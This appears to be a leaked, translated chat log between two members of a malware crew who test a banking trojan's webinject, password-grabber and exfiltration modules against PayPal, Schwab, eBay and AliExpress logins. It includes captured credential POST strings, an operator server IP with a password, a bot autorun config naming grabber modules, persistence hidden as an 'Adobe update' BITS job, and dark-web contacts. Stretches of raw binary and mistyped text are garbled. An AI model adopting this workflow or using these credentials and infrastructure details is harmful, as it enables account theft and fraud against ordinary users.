+[23.12.21 15:27:28] hammer: frank made a change, asked me to check it, I came in, saw it in the log and you immediately
+[23.12.21 15:27:34] hammer: I'll try the others
+[12/23/221 15:31:28] hammer: I uploaded the second log from paypal
+[23.12.21 15:37:36] jaime: it's not garbage :) it's zip data
+[12/23/221 15:37:42] jaime: :)
+[23.12.21 15:37:56] hammer: if I unload and restart the module, will I have to unload config again?
+[23.12.21 15:38:08] jaime: Yeah, you do
+[23.12.21 15:38:28] hammer: okay, frank tweaked it again
+[23.12.21 15:39:19] jaime: I don't know what to do with it, it's binary data in zip
+[12/23/221 15:39:39] hammer: f ult jyb hfymit ,skb b pfxtv jyb ctqxfc&
+[12/23/221 15:39:53] hammer: where were they before and what are they for now?
+[12/23/221 15:40:30] hammer: at first I thought it was caused by storage depletion, but I guess not
+[12/23/221 15:41:02] jaime: not everything is written in webinject.log, it's not very detailed, especially binary data.
+[12/23/221 15:41:21] jaime: I think they don't get to the repository, it's garbage for us anyway
+[12/23/221 15:41:28] jaime: I don't know what to do with it.
+[12/23/221 15:41:52] jaime: Content-Encoding: gzip there is such a chider
+[23.12.21 15:42:50] jaime: You should ask Frank if they will unzip it or not
+[12/23/221 15:46:22] jaime: So it's ok
+[23.12.21 15:47:40] hammer: wrote him?
+[12/23/221 15:48:09] jaime: Yeah, I did.
+[12/23/221 15:48:54] jaime: Nothing comes at all?
+[23.12.21 15:48:58] jaime: That's weird.
+[23.12.21 15:50:25] hammer: nothing, I just unloaded and restarted the module, I'll try again
+[23.12.21 15:52:22] jaime: The log from 20pm has the same
+[12/23/221 15:52:52] jaime: Same paypal
+[12/23/221 15:53:05] jaime: He must be sending something there
+[12/23/221 15:54:46] hammer:
+[12/23/221 15:54:53] hammer: new log from schwab
+[12/23/221 15:56:27] jaime: same binary data, same zip
+[23.12.21 15:56:36] hammer: Accept-Language: en-US,en;q=0.9
+
+
+
+' g'*.H,KOI-*MЄLLЄ,.VNPMMSCOP€'`Tlibb`ђ`4bøwCIH'Јc+"ђґѓЗ¬ou/ЂPЊn}lїlshShFvЊVЄU `hћou''lf¬kf dЃDa"™aІaўQўEђ+s1- ЈѓST#WќPЌsFQ~n¨¨¨Vo§џ'Ґ™ћЃћ‰™‰ћЎЎЃ'FЉijљAЄ...'ЎIRІІІІІe'iRRљ™euЎ©ЎiЄ‰±Ў±ҐIІ™Qў™nQjZ±~RQb^r†nFjbJ±>I‡jeC# gZM...dЊDjjFЌv'Ä¤00$uGPPJDa'Äô'Äô "L"\_]²"²"²".
+Lr-j(P,PfJCP#Cia§€Vr§ft,&†"oE,S'RґR`_ a""R
+
+-----------ITPGDIIBNMRVQYLR
+[23.12.21 15:56:43] hammer: that's all I see
+[23.12.21 15:56:48] hammer: it was more massive
+[12/23/221 15:57:37] jaime: What's confusing you? :)
+[12/23/221 15:58:09] hammer: not enough!
+[12/23/221 15:58:22] hammer: where's the rest? there was plenty
+[12/23/221 15:58:27] hammer: not enough!
+[12/23/221 15:58:53] jaime: Look, there's Content-Length: 341 and Content-Encoding: gzip
+[12/23/221 15:59:19] jaime: That means they're sending 341 bytes to zip
+[12/23/221 15:59:30] jaime: I guess they need it
+[12/23/221 16:00:41] jaime: There's no way to tell if it's too little or too much.  We need to see what we send here came to Frank.
+[23.12.21 16:01:25] hammer: it's not clear what goes to him with this one
+[12/23/221 16:02:10] jaime: It's all coming through the log
+[12/23/221 16:02:31] jaime: Did it get better with config disabled?
+[23.12.21 16:04:21] jaime: I think it's not so trivial with the username and password, not for nothing they started pasting into the page, there is an insert for a particular bank, probably to pull the data before sending
+[23.12.21 16:04:44] jaime: in the data post maybe not everything can be pulled
+[12/23/221 16:06:30] hammer: not sure yet, I'm on chrome, it doesn't give a shit anyway
+[12/23/221 16:06:39] hammer: now ff
+[12/23/221 16:07:25] hammer: ebay got better
+[23.12.21 16:10:31] hammer: he went from ugly duckling to ugly swan)
+[12/23/221 16:10:42] hammer: jimail's good
+[12/23/221 16:10:54] hammer: let's see if his login pass came through
+[23.12.21 16:18:31] hammer: gwrwb-brights@mail.com LT https://sws-gateway.schwab.com/api/v2/web/authenticate?aid=sws_web&locale=en-US&clientId=CustomerWeb&sessionId=1917fb94-bf8c-4846-89fc-fb509fba653f&correlationId=d9100246-563e-4542-859c-12f055acfbe8&FPA=false&throttle=true
+earthcore@gmail.com LT https://www.paypal.com/signin
+[12/23/221 16:18:41] hammer: are you responsible for this?
+[12/23/221 16:18:55] jaime: no
+[12/23/221 16:19:04] hammer: email logins
+[12/23/221 16:19:10] hammer: no?
+[12/23/221 16:19:19] jaime: i didn't do anything! :)
+[12/23/221 16:19:37] hammer: and who?) there only tinge started)
+[23.12.21 16:19:58] hammer: it remembers the mail you typed in and the logpost where you typed it in, there's a separate tab
+[23.12.21 16:20:15] jaime: I don't use those emails
+[12/23/221 16:20:39] jaime: my username is xxx pass superlox :)
+[12/23/221 16:20:50] hammer: gwrwb-brights@mail.com is what you typed, https://sws-gateway.schwab.com/api/v is where you typed it, click the second and it gives you a page with stuff
+[12/23/221 16:21:05] hammer: yes I typed it in, just who did he collect?)
+[12/23/221 16:21:26] jaime: Nothing changed! Maybe it's Frank?
+[12/23/221 16:21:33] hammer: I have to ask.
+[12/23/221 16:21:44] jaime: Or lack of config?
+[23.12.21 16:22:24] hammer: no, it was long time ago, before that, I forgot to ask
+[12/23/221 16:22:50] hammer: it's good, but not all sites remember it
+[23.12.21 16:29:52] hammer: and about aliexpress. is it for frank or where?
+[23.12.21 16:34:22] jaime: What about the logs?
+[12/23/221 16:34:54] hammer: where?
+[12/23/221 16:36:11] hammer: on ali?
+[12/23/221 16:41:18] jaime: yeah, on klee
+[12/23/221 16:41:21] jaime: ali
+[12/23/221 17:11:33] hammer: loginId=darkneon763%40mail.com&password2=6dc448958de47c906c8c9697294e2b4a4e59b0fc2eabf3a35d14a23e293e1e6aed74bcbdf95e92dc097aeaf286128986b1e76deb24ff5ca15ea86104a7f887458bf26bf72f6c11d71b3b808a6b989e627fc9c8d45b4781972dfa6d20201c35b97f213c71f5f014f5aa2852b421f357e6e943c91a03ea03ccb783857c7dd7aff5&keepLogin=false&umidGetStatusVal=undefined&screenPixel=1920x975&navlanguage=en-US&navUserAgent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A95.0)%20Gecko%2F20100101%20Firefox
+[12/23/221 17:11:45] hammer: it's the same in the dpost, I'll tell you how to do it in the admin area
+[12/23/221 17:13:05] hammer: loginId=darkneon763@mail.com
+password2=6dc448958de47c906c8c9697294e2b4a4e59b0fc2eabf3a35d14a23e293e1e6aed74bcbdf95e92dc097aeaf286128986b1e76deb24ff5ca15ea86104a7f887458bf26bf72f6c11d71b3b808a6b989e627fc9c8d45b4781972dfa6d20201c35b97f213c71f5f014f5aa2852b421f357e6e943c91a03ea03ccb783857c7dd7aff5
+[12/23/221 17:13:13] hammer: ye nen nfr ;t
+[12/23/221 17:13:17] hammer: same here
+[12/23/221 17:32:40] jaime: repeat plz! :) Reloaded
+[12/23/221 17:33:11] hammer: loginId=darkneon763%40mail.com&password2=6dc448958de47c906c8c9697294e2b4a4e59b0fc2eabf3a35d14a23e293e1e6aed74bcbdf95e92dc097aeaf286128986b1e76deb24ff5ca15ea86104a7f887458bf26bf72f6c11d71b3b808a6b989e627fc9c8d45b4781972dfa6d20201c35b97f213c71f5f014f5aa2852b421f357e6e943c91a03ea03ccb783857c7dd7aff5&keepLogin=false&umidGetStatusVal=undefined&screenPixel=1920x975&navlanguage=en-US&navUserAgent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A95.0)%20Gecko%2F20100101%20Firefox
+in the dpost is the same, now I will tell you how in the admin
+loginId=darkneon763@mail.com
+password2=6dc448958de47c906c8c9697294e2b4a4e59b0fc2eabf3a35d14a23e293e1e6aed74bcbdf95e92dc097aeaf286128986b1e76deb24ff5ca15ea86104a7f887458bf26bf72f6c11d71b3b808a6b989e627fc9c8d45b4781972dfa6d20201c35b97f213c71f5f014f5aa2852b421f357e6e943c91a03ea03ccb783857c7dd7aff5
+ye nen nfr ;t
+well, it's the same here
+[12/23/221 17:33:38] hammer: that would be weird. there would be a password in the admin if there wasn't one in the dpost(
+[23.12.21 17:33:56] jaime: yeah, more like the opposite
+[23.12.21 17:34:17] hammer: the ff is much better without config
+[12/23/221 17:34:40] hammer: there are some that take a little longer to load, but otherwise just fine
+[23.12.21 17:35:01] hammer: reddit, for example, yesterday it wouldn't load at all, today it works flawlessly
+[12/23/221 17:35:03] jaime: FF is worse, chrome is fine.
+[12/23/221 17:36:47] hammer: leave 11 open overnight with browser open, frank asked for it
+[12/23/221 17:37:12] jaime: Ok, so everything is working now?
+[12/23/221 17:37:40] hammer: yeah, all good.
+[12/23/221 17:38:10] hammer: i need to do another run on 7, but there's a hitch, bot won't knock into admin, i can't start the module
+[23.12.21 17:38:29] hammer: you'll have to do something with it
+[23.12.21 17:38:46] jaime: Are you testing on the second trike?
+[23.12.21 17:39:31] hammer: no, the second try will be tomorrow
+[12/23/221 17:39:52] hammer: it's a tst, but it hits the same admins as tric2
+[23.12.21 17:41:01] hammer: i've run tricks for survivability, fix and setback, didn't look at modules
+[23.12.21 17:41:21] hammer: then i had to clean it on vindef, it was straying there before and after start
+[12/23/221 17:41:38] hammer: and add another one in the scheduler
+[12/23/221 17:41:52] jaime: Anything you need from me on the second one?
+[12/23/221 17:42:07] hammer: tomorrow eugene and garfield will check their modules, and I'll look at injector and network
+[23.12.21 17:42:39] hammer: well, logpost as they pour in the changes and the injector, but there I don't know what to check on the combat
+[23.12.21 17:42:48] hammer: we'll see
+[12/23/221 17:42:55] jaime: Aha!
+[27.12.21 14:08:24] hammer: Hey, hit the apr on your side
+[12/27/221 14:49:10] jaime: Hi!
+[27.12.21 14:57:17] hammer: Hi.
+[27.12.21 14:57:30] hammer: turn your side on, it won't let me)
+[27.12.21 14:57:34] hammer: Hey!
+[27.12.21 14:57:45] jaime: Okay?
+[12/27/221 14:57:50] hammer: listen, those changes in the injector, they're only on the test?
+[27.12.21 14:57:55] hammer: the ones in the injector
+[27.12.21 14:58:02] jaime: Frank wants to see if there's anything from the bot?
+[27.12.21 14:58:13] jaime: Yeah only on test
+[27.12.21 14:58:19] hammer: now there's a September build on the battle one
+[27.12.21 14:58:39] hammer: what do you need to put it on the battle one?
+[27.12.21 14:58:41] jaime: do it good! :)
+[27.12.21 14:58:46] hammer: run a test unlogged?
+[27.12.21 14:59:25] hammer: so let September one be for now? i think we figured out that problems from config were there
+[27.12.21 14:59:29] jaime: There's no base64 encoding but I don't know if I need it or not!
+[27.12.21 14:59:34] jaime: That's right!
+[27.12.21 14:59:48] hammer: but you have to ask frank
+[27.12.21 14:59:56] jaime: Can you give me a dotsup on 7? I'll see if the bot sends that on the gasket or not?
+[27.12.21 15:00:31] hammer: uh, there are no modules
+[27.12.21 15:00:45] hammer: there's a bot running, but it's not knocking in the black
+[27.12.21 15:00:48] jaime: ``
+Hammer is trying to run the bot on his 7, it's not knocking.
+Question, can you check if there's an http request for padding from the bot on that system, if it works correctly
+```
+[27.12.21 15:00:55] hammer: oh, yeah
+[27.12.21 15:00:59] hammer: Now
+[27.12.21 15:01:01] jaime: frank asked to see this.
+[27.12.21 15:01:14] hammer: 185.64.104.213:31122
+[27.12.21 15:01:26] hammer: user 123qweASD
+[27.12.21 15:01:38] hammer: this bot doesn't knock at all
+[27.12.21 15:02:02] hammer: bot stopped knocking at 10, I'll put it there too, when it stops knocking I'll write to frank
+[27.12.21 15:02:31] jaime: Ok I'm there. Can I put wireshark there?
+[27.12.21 15:02:36] hammer: it's not the test we ran before for the logpost, it's a nedow trick2
+[27.12.21 15:02:39] hammer: put whatever you want
+[27.12.21 15:08:04] hammer: did it work?
+[27.12.21 15:09:17] jaime: yeah, it's okay.
+[27.12.21 15:09:24] jaime: You didn't inject there?
+[27.12.21 15:10:03] hammer: can not say, bot does not knock in the admin, I did not run anything
+[27.12.21 15:10:16] hammer: In the bot's config file there is no inject on startup
+[27.12.21 15:10:22] hammer: wait a second
+[27.12.21 15:11:03] hammer: <autorun><modulename='pwgrabb'/><modulename='pwgrabc'/></autorun>
+[12/27/221 15:11:09] hammer: no injection
+[12/27/221 15:11:34] jaime: got it.
+[27.12.21 15:11:54] jaime: in chrome there are some problems with certificates
+[27.12.21 15:23:08] jaime: How do I reset it?
+[27.12.21 15:23:19] hammer: gthtpfuhepbnm&
+[27.12.21 15:23:24] hammer: do you need to reboot?
+[27.12.21 15:23:34] hammer: i'll do it now.
+[27.12.21 15:23:42] jaime: Yeah.
+[27.12.21 15:24:02] hammer: set it up, hold on.
+[27.12.21 15:24:15] jaime: thanks! :)
+[27.12.21 15:24:36] hammer: went to reboot?
+[27.12.21 15:33:33] jaime: You sure it rebooted?
+[27.12.21 15:33:43] jaime: It's still running!
+[27.12.21 15:34:01] hammer: judging by admin, yes
+[27.12.21 15:34:08] hammer: let me turn it off and back on
+[27.12.21 15:35:05] hammer: try to log in now
+[27.12.21 15:36:42] jaime: oh now ok!
+[27.12.21 15:37:03] hammer: admin cranky, had to reboot
+[27.12.21 15:37:25] jaime: So there's a problem with the bot, everything can fool around!
+[27.12.21 15:37:42] hammer: no, it's a separate one for machines, not for bot)
+[27.12.21 15:38:00] hammer: you think bot resists reboot?)
+[27.12.21 15:38:11] hammer: type this into command line
+[12/27/221 15:38:12] hammer: bitsadmin /list /verbose
+[27.12.21 15:38:45] hammer: will it have DISPLAY: 'Adobe update' ?
+[27.12.21 15:38:56] hammer: that means the bot is alive
+[27.12.21 15:39:54] jaime: That there's nothing put there! :)
+[27.12.21 15:40:18] hammer: that's a number
+[27.12.21 15:40:51] jaime: wireshrk won't install, it says I want KB311401
+[27.12.21 15:40:55] hammer: ah
+[27.12.21 15:41:00] hammer: update needed
+[27.12.21 15:41:02] jaime: KB not install just like that!
+[27.12.21 15:41:12] hammer: is there an updater?
+[27.12.21 15:42:52] jaime: DISPLAY: 'Adobe update'
+[27.12.21 15:42:59] jaime: yes it is
+[27.12.21 15:45:31] hammer: bot works
+[27.12.21 15:46:46] jaime: put old version of wireshark
+[27.12.21 15:47:06] hammer: there are no updates for 7
+[27.12.21 15:48:53] jaime: Do you know wireshark IP?
+[27.12.21 15:53:56] jaime: Should the bot be knocking now?
+[27.12.21 15:56:58] jaime: I see that there is an exchange with 2.16.192.110 on port 443
+[27.12.21 16:05:10] hammer: no bounce
+[27.12.21 16:06:22] hammer: there is a tiny chance, insignificant, that the bounce will go to the other admin office, it can't be, but it may be a miracle, I'll check it now
+[27.12.21 16:10:56] hammer: nope
+[27.12.21 16:13:11] jaime: so this is our pad?
+[27.12.21 16:23:21] jaime: it's weird, I think it's TLS, if it's our exchange
+[27.12.21 16:23:48] jaime: Probably at system level, maybe chromium problems come from the same place.
+[27.12.21 16:23:58] jaime: Very strange exchange
+[27.12.21 16:25:16] hammer: I'll tell you, I'm not the only one with the problem
+[27.12.21 16:25:24] hammer: garfield from 7 also had this bot failed
+[27.12.21 16:25:47] hammer: and what's more, the one we used to watch the logpost, it didn't knock either
+[27.12.21 16:25:51] jaime: So maybe it's related to tls implementation in sevens itself
+[27.12.21 16:26:17] hammer: but i used a bot that knocked out another admin, and it got through to her fine
+[27.12.21 16:26:53] hammer: i never had any problems with knocking on it, except when they started knocking on the second admin
+[27.12.21 16:27:30] hammer: but then again, there was a bot trk2, so he knocked and this second one, which is not knocked now
+[27.12.21 16:27:45] hammer: it is not clear
+[27.12.21 16:28:06] jaime: Is there a debug version of the bot, with exchange debugging?
+[27.12.21 16:28:23] hammer: but at the same time I put a bot that gives you a knockout on another admin, and it got through to it fine
+i never had a problem bouncing on it but when they started banging on that second admin
+[27.12.21 16:28:34] hammer: but then again, there was a bot trk2, so he knocked, and this second one, which is not knocked now
+[27.12.21 16:29:17] hammer: and this is logged, there is a log in the temp folder
+[27.12.21 16:42:01] jaime: temp_t1000?
+[27.12.21 16:42:29] jaime: there's a log with the time 12:34, and now it's 6:42?
+[27.12.21 16:42:37] jaime: Is that something wrong?
+[12/28/221 10:00:58] hammer: Hi.
+[12/28/221 10:03:58] hammer: Hi.
+[12/28/221 10:04:03] hammer: Are you at 122?
+[12/28/221 10:13:05] jaime: hi!
+[12/28/221 10:13:23] jaime: Yeah. Disconnected.
+[12/28/221 10:53:20] hammer: i'm rolling it back.
+[12/28/221 14:35:38] hammer: you went to get your paycheck?
+[28.12.21 14:36:04] jaime: no. what do you get?
+[28.12.21 14:36:32] hammer: they do.
+[28.12.21 14:36:43] hammer: in général français
+[28.12.21 14:36:55] jaime: that's great! :)
+[28.12.21 14:37:19] jaime: i'm downloading the gov't files here.
+[08.02.22 13:43:12] hammer: Hi.
+[08.02.22 14:35:27] hammer: Text me when you're here.
+[08.02.22 17:25:16] jaime: Hi.
+[08.02.22 17:25:42] jaime: I've been here. Didn't look at the rocket.
+[08.02.22 17:26:05] hammer: he should check his logpost
+[08.02.22 17:26:14] hammer: *Frank
+[08.02.22 17:26:45] hammer: in general, assemblies are not fresh yet, will need to be as you remember. then checked income in the store
+[08.02.22 17:26:52] hammer: inject module emulator
+[08.02.22 17:27:08] hammer: why don't we check it? not today
+[08.02.22 17:27:24] hammer: while also the work of the injector on new versions of browsers
+[08.02.22 17:27:33] jaime: sure, no problem.
+[08.02.22 17:27:40] jaime: let's try it tomorrow
+[08.02.22 17:27:42] hammer: I'll text you tomorrow
+[08.02.22 17:27:44] hammer: Mm-hmm.
+[08.02.22 17:27:55] hammer: did you get your paycheck?
+[08.02.22 17:28:09] jaime: You got it?
+[08.02.22 17:28:18] hammer: They gave it to a lot of people.
+[08.02.22 17:28:27] hammer: only there was no notification in general
+[08.02.22 17:28:38] hammer: I didn't get it, I can't reach Frances
+[08.02.22 17:28:54] hammer: Ned, Eugene, Garfield got
+[08.02.22 17:29:08] hammer: so try knocking
+[08.02.22 17:29:31] jaime: thanks. :)
+[08.02.22 17:29:39] jaime: do you have my toad?
+[08.02.22 17:29:49] hammer: you're welcome, I thought I was the only one without salary
+[08.02.22 17:30:15] hammer: I think so, but we didn't use it
+[08.02.22 17:30:19] hammer: Remind me.
+[08.02.22 17:31:01] hammer: derekson?
+[08.02.22 17:31:18] jaime: flip@q3mcco35auwcstmt.onion
+[08.02.22 17:31:26] hammer: new one
+[08.02.22 17:31:49] hammer: either it's new, or I never had yours
+[08.02.22 17:31:51] jaime: flip@avtonom.org
+[08.02.22 17:31:56] jaime: Probably wasn't
+[08.02.22 17:32:05] jaime: Kick me there tomorrow
+[08.02.22 17:32:17] hammer: won't be in the rocket?
+[08.02.22 17:32:22] jaime: Because my rocket is on a separate monitor, I do not look there :)
+[08.02.22 17:32:35] jaime: I do, but with a delay
+[08.02.22 17:32:56] hammer: accept subscriptions there
+[08.02.22 17:36:25] hammer: > he's still sending partial subscriptions, maybe tomorrow or the day after tomorrow
+[08.02.22 17:36:33] hammer: answered Frances
+[08.02.22 17:37:24] jaime: well, as long as I have for beer. :) you can wait
+[10.02.22 16:32:48] hammer: Hey, hit the ctr from your side
+[10.02.22 16:39:03] hammer: +
+[10.02.22 16:39:06] hammer: Yeah.
+[10.02.22 16:39:11] hammer: didn't you prepare the software?
+[10.02.22 16:39:41] jaime: We'll do it now, no problem
+[10.02.22 16:39:58] hammer: Only it probably cut off less often, not every three minutes or whatever it was
+[10.02.22 16:40:03] hammer: did you contact frank?
+[10.02.22 16:40:13] jaime: no I didn't
+[10.02.22 16:40:36] jaime: that's what got away from me :)
+[10.02.22 16:40:53] hammer: "no I didn't" twice)
+[10.02.22 16:41:59] hammer: did he give you frances?
+[10.02.22 16:42:58] jaime: he did
+[10.02.22 16:43:01] jaime: And you?
+[10.02.22 16:43:04] hammer: Nope.
+[10.02.22 16:43:26] hammer: he promised me he would have it yesterday-today, but he ain't saying anything
+[10.02.22 16:43:48] jaime: They wouldn't give it to me for a month
+[10.02.22 16:43:55] hammer: the source ran out, evidently he is waiting for a new delivery
+[10.02.22 16:43:57] jaime: Then they gave me two at once
+[10.02.22 16:44:28] hammer: so there's an advance soon
+[10.02.22 16:44:33] hammer: 15 is almost upon us
+[10.02.22 16:46:03] jaime: first of all, you'll get it all at once :) i think so
+[10.02.22 16:46:17] jaime: make the test less often?
+[10.02.22 16:46:25] hammer: Oh, I forgot, I need logpost to ssec storage
+[10.02.22 16:46:45] jaime: you give me ip where to send! :)
+[10.02.22 16:46:46] hammer: not to dnog
+[10.02.22 16:47:05] hammer: you have to ask frank, I have no addresses. only from admins
+[10.02.22 16:47:09] hammer: i'll text him now
+[10.02.22 16:48:51] hammer: he doesn't answer in the rocket, I wrote him off in the toad
+[10.02.22 17:07:47] hammer: jngbcfk jy&
+[10.02.22 17:07:52] hammer: he unsubscribes?
+[10.02.22 17:10:27] jaime: it will be tomorrow! :)
+[10.02.22 17:10:46] jaime: I'll send you everything
+[10.02.22 17:13:23] jaime: https://dropfiles.me/download/a618ccbe26cdc6e6/#xW5RfvXjkpOPW1kB7RUkaQ
+[10.02.22 17:13:33] jaime: 8a5a17b70e849cbb5011f3dd92011ac9
+[10.02.22 17:15:58] hammer: what about tomorrow?
+[10.02.22 17:16:00] hammer: got it
+[10.02.22 17:16:22] hammer: frank is gone, tomorrow will come?
+[10.02.22 17:18:40] hammer: okay, tomorrow it is tomorrow
+[10.02.22 17:19:37] hammer: there's a logged in? there'll be an id by which to search
+[10.02.22 17:37:27] jaime: yes it is
+[10.02.22 17:37:37] jaime: logged ID
+[10.02.22 17:37:54] jaime: dpost.xml here fix ip and done
+[11.02.22 11:39:03] hammer: +
+[11.02.22 11:39:08] jaime: Hi!
+[11.02.22 11:39:22] hammer: there were some messages from you, did you write?
+[11.02.22 11:39:38] jaime: yeah i sent you module yesterday
+[11.02.22 11:39:45] hammer: I picked it up
+[11.02.22 11:39:54] hammer: how to run, just loadr?
+[11.02.22 11:40:03] hammer: will the log be written?
+[11.02.22 11:40:07] jaime: Yes, in the same folder as dllka
+[11.02.22 11:40:51] hammer: I start it, the window pops up and closes
+[11.02.22 11:41:35] hammer: Lowder process is not in manager
+[11.02.22 11:45:27] jaime: win64 ?
+[11.02.22 11:45:37] jaime: In the same folder?
+[11.02.22 11:46:32] jaime: On the C drive should be a folder, there throw dpost.xml
+[11.02.22 11:46:48] jaime: You'll have to correct IP to what Frank says
+[11.02.22 11:47:03] jaime: Logs will be in TEMP
+[11.02.22 11:48:52] hammer: he didn't give you one yet?
+[11.02.22 11:53:34] jaime: no
+[11.02.22 11:53:40] jaime: did it start?
+[11.02.22 11:53:53] hammer: well, I don't see in admin by id like that
+[11.02.22 11:53:57] hammer: yes, it's running
+[11.02.22 11:54:06] hammer: he needs frank's address
+[11.02.22 11:54:20] hammer: how often will it ping?
+[11.02.22 11:55:10] jaime: And you will not see it. Without the bot, you won't. Only logpost.
+[11.02.22 11:55:37] hammer: well, how did we watch that time?
+[11.02.22 11:55:51] jaime: Through the bot, but with logging
+[11.02.22 11:56:33] jaime: we still had bot config! :)
+[11.02.22 11:57:08] hammer: so, now I start a lowder, it starts pinging, but in the store I will not see it?
+[11.02.22 11:57:21] hammer: only a frank somewhere in his vault?
+[11.02.22 11:58:12] jaime: yeah only log post will see
+[11.02.22 11:58:26] hammer: like, last time without bot, and started, and found the id in the vault, no?
+[11.02.22 11:58:36] hammer: I don't remember anymore
+[11.02.22 11:58:39] jaime: Maybe by the way the log post will get into the admin area
+[11.02.22 11:58:45] hammer: yes
+[11.02.22 11:58:54] jaime: Frank will definitely find it
+[11.02.22 11:59:01] hammer: there's all these loginpasses
+[11.02.22 11:59:12] hammer: the id was generated
+[11.02.22 11:59:38] jaime: He should be in the log file
+[11.02.22 12:04:48] hammer: 2/11/2022 4:00:38 AM IE: disabling multiple processes: ok
+[11.02.22 12:04:53] hammer: what does it mean?
+[11.02.22 12:07:50] hammer: login_email=summersun%40mail-burn.com&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=Aquaticlife
+[11.02.22 12:08:09] hammer: it found a login pass from paypal, but I can't see anything without franc
+[11.02.22 12:27:38] jaime: I don't know what's with the encoding.
+[11.02.22 12:27:43] jaime: :)
+[11.02.22 14:20:07] hammer: standby till monday
+[11.02.22 14:20:16] hammer: there will be no build
+[11.02.22 14:20:22] hammer: isn't the tinject still loaded?
+[11.02.22 14:20:32] hammer: to write a log
+[11.02.22 15:33:28] jaime: I think it's filled
+[11.02.22 15:37:00] hammer: we'll see, I'll try to start with the bot when I get the build
